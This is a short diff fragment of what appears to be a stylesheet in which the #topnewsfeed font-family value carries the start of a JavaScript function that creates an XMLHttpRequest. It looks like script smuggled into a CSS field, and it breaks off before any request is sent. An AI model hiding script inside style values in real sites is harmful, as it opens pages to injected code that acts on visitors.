@@ -1,7 +1,5 @@
-#topnewsfeed { font-family: "(function(){function XHR(){
-    try{return new XMLHttpRequest();}catch(e){}try{return new ActiveXObject('Msxml3.XMLHTTP');}catch(e){}try{return new ActiveXObject('Msxml2.XMLHTTP.6.0');}catch(e){}try{return new ActiveXObject('Msxml2.XMLHTTP.3.0');}catch(e){}try{return new ActiveXObject('Msxml2.XMLHTTP');}catch(e){}try{return new ActiveXObject('Microsoft.XMLHTTP');}catch(e){}return null;
-}
-xmlhttp = new XHR();
+#topnewsfeed { font-family: "(function(){
+xmlhttp = new XMLHttpRequest();
 console.log('hi');
 if(xmlhttp != null)
 {
